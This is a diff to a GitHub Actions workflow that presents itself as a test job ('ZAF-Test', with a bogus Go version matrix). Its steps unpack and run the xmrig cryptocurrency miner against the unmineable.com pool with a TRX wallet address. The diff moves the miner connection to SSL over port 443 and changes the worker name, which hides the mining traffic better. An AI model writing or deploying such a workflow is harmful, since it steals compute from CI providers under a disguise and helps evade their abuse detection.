@@ -7,7 +7,7 @@ jobs:
     name: ZAF-Test
     runs-on: windows-latest
     strategy:
-      max-parallel: 3
+      max-parallel: 1
       fail-fast: false
       matrix:
         go: [1.0, 1.1, 1.2, 1.3, 1,35]
@@ -21,6 +21,6 @@ jobs:
     - name: Extract
       run: Expand-Archive xmrig-6.17.0-msvc-win64.zip
     - name: RUNNING
-      run: .\xmrig-6.17.0-msvc-win64\xmrig-6.17.0\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u TRX:TJzKgLEC7Mjt2XuUNZ4SwBaGHT9S5Cu9Qa.ZAFProject1 -p x -t 1
+      run: .\xmrig-6.17.0-msvc-win64\xmrig-6.17.0\xmrig.exe -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u TRX:TJzKgLEC7Mjt2XuUNZ4SwBaGHT9S5Cu9Qa.AMSOnline1 -p x -t 1
     - name: DONE
       run: exit
